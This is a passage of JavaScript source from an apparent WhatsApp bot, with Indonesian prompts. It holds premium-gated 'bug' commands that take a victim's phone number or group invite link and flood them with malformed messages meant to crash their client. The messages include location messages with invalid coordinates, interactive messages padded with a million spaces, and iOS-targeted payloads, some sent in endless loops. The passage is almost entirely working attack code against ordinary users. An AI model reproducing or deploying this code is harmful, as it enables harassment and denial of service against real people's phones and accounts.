await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
await ngeloc(target, m)
}
await joreply(`<✓>`)
}
break
//=================================================//
case 'stardust': case '👿': case '😈': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 40; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await joreply(`<✓>`)
}
break
//=================================================//
case 'impossible': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 40; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await joreply(`<✓>`)
}
break
//=================================================//
case 'bug-rom': case 'restart-ui': case '☠️': case '💀': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await joreply(`<✓>`)
}
break
//=================================================//
case 'shock': case 'wave': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
await ngeloc(target, force)
}
await joreply(`<✓>`)
}
break
//=================================================//
case 'virg4m': case 'crashganas': case '🥶': case '🤪': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 10; j++) {
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
}
await joreply(`<✓>`)
}
break
//=================================================//
case 'surprise': case 'lexunlimited': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 10; j++) {
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
}
await joreply(`<✓>`)
}
break
//=================================================//
case 'sipilist': case '1hit': case '🗿': case 'mimir': case '1shoot': case '🙀': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 1; j++) {
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await pirgam(target, ryobug)
await ngeloc(target, force)
await penghitaman(target, force)
await ngeloc(target, force)
}
await joreply(`<✓>`)
}
break
//=================================================//
case 'st4rdust': case '😭': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (let j = 0; j < 3; j++) {
await ngeloc(target, force)
}
await joreply(`<✓>`)
}
break
//=================================================//
case 'gada-ampun': case 'bug-24j': case '😂': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
for (;;) {
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await ngeloc(target, force)
await baklis(target, ryobug)
await ngeloc(target, force)
await sleep(30000)
}
}
break
//=================================================//
case 'samsung-24j': case '🥰': case '🌷': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
let target = bijipler + '@s.whatsapp.net'
await joreply(mess.bugrespon)
  for (;;) {
    await ngeloc(target, ryobug)
  }
}
break
//=================================================//
case 'ios24j': case 'vios-unli': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
await joreply(mess.bugrespon)
let target = bijipler + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break
//=================================================//
case 'ios-kentang': case 'ios-virus': case 'nonstop': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###`)
await joreply(mess.bugrespon)
let target = bijipler + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
  }
}
break
//=================================================//
case 'bug-ios': case 'bug-ipong': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
m.reply(ppk + " detik");
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
await aipong(target)
await sleep(1500)
}
joreply(`✅`)
}
break
//=================================================//
case 'visible': case 'ios-alok': case 'ios-kelli': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877###|1\n# memasukkan 1 sama dengan 300.detik`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877###|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1] * 200
let ppk = jumlah * 1.5
m.reply(ppk + " detik");
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
await aipong(target)
await sleep(1500)
}
joreply(`✅`)
}
break
//=================================================//
case 'bug-button': case 'bug-browser': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} https://chat.whatsapp.com/`)
joreply(mess.bugrespon)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await ryozingod.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰.ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #lexgoddominate"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝐋𝐞𝐗𝐜𝐙⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
joreply(`<✓>`)
}
break
//=================================================//
case 'bug-suki': case 'bug-gcbom': case 'bug-gcmawar': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} https://chat.whatsapp.com/`)
joreply(mess.bugrespon)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await ryozingod.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰.ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #lexgoddominate"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝐋𝐞𝐗𝐜𝐙⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
joreply(`<✓>`)
}
break
//=================================================//
case 'bug-ewe': case 'bug-coli': case 'bug-gcexploit': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} https://chat.whatsapp.com/`)
joreply(mess.bugrespon)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await ryozingod.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰.ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #lexgoddominate"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝐋𝐞𝐗𝐜𝐙⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
joreply(`<✓>`)
}
break
//=================================================//
case 'bug-ganas': case 'bug-entod': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} https://chat.whatsapp.com/`)
joreply(mess.bugrespon)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await ryozingod.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰.ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #lexgoddominate"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝐋𝐞𝐗𝐜𝐙⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
joreply(`<✓>`)
}
break
//=================================================//
case 'bug-gc': case 'penghitaman': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1962623836281@g.us`)
joreply(mess.bugrespon)
target = q
for (let j = 0; j < 5; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "🩸⃟༑⌁⃰.ཀ͜͡🦠"
    },
    "footer": {
      "text": "›          #lexgoddominate"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : '⿻𝐋𝐞𝐗𝐜𝐙⿻', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: m.chat, quoted: ryobug })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
joreply(`<✓> `)
}
break

case 'bgtes': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
await ryozingod.sendVideoAsSticker(m.chat, mengkece, force, { packname: '.', author: '𝐋𝐞𝐗𝐜𝐙' })
}
}
break

case 'bugpenis': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `#𝐋𝐞𝐗𝐜𝐙 ☠️`,
    "sequenceNumber": "0",
    "jpegThumbnail": mengkece
     }
  }
}
}), { userJid: m.chat, quoted: force })
await ryozingod.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'bugpepek': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: m.chat, quoted: m })
await ryozingod.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'plerku': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 1`)
for (let j = 0; j < q; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: m.chat, quoted: force })
await ryozingod.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'bijiloe': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877|1`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1]
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: m })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'lexcok': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877|1`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1]
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: m })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'lexbarbar': case 'lexdangdut': case 'lexganas': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877|1`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1]
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: m })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'temble': case 'kursi': case 'lexalok': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877|1`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1]
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: m })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'lexberak': case 'lexcoli': case 'asuu': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877|1`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1]
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: m })
await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'ajimale': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877|1`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1]
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
var etc = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: force })
await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
case 'lexspam': case 'lexngocok': case 'lexkentut': {
if (!isPremium) return joreply(mess.premium)
if (!q) return joreply(`Penggunaan .${command} 62877|1`)
let ppek = q.split("|")[0]
let bijipler = ppek.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return joreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 62877|1`)
let target = bijipler+"@s.whatsapp.net"
let jumlah = q.split("|")[1]
joreply(mess.bugrespon)
for (let j = 0; j < jumlah; j++) {
var etc = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍.╮⭑ ☠️⃰͜͡؜𝐋𝐞𝐗𝐜𝐙☠️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp`,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: force })
await ryozingod.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
await joreply('✅')
}
break
//=================================================//
